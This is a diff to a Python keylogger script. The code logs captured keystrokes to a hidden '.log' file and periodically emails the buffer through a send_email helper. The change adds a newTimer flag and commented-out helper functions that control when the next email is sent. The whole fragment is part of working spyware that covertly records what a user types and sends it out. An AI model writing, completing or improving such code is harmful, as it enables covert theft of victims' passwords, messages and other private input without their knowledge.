@@ -10,11 +10,32 @@ path = os.getcwd()
 log_file = path + '/.log'
 
 send = True
+newTimer = False
 
-
+#
+# def get_send():
+#     return send
+#
+#
 def is_send():
     global send
     send = True
+#
+#
+# def not_send(send):
+#     send = False
+#
+#
+# def get_newTimer():
+#     return newTimer
+#
+#
+# def is_newTimer(newTimer):
+#     newTimer = True
+#
+#
+# def not_newTimer(newTimer):
+#     newTimer = False
 
 """
 Class that processes some basic functions of a keylogger.
@@ -66,10 +87,12 @@ class Keylogger:
             f.write(data)
         # send email and clear temp log buffer.
         global send
-        if send == True:
-            print(self.log)
+        global newTimer
+        if send:
+            print('send')
             md.send_email(self.log)
             send = False
+            newTimer = True
         self.log = ''
 
     def start(self):
@@ -81,6 +104,8 @@ class Keylogger:
 kl = Keylogger()
 while 1:
     kl.start()
-    if not send:
+    # if send is False and new timer is True, we set a new timer.
+    if not send and newTimer:
         t = Timer(20.0, is_send)
         t.start()
+        newTimer = False
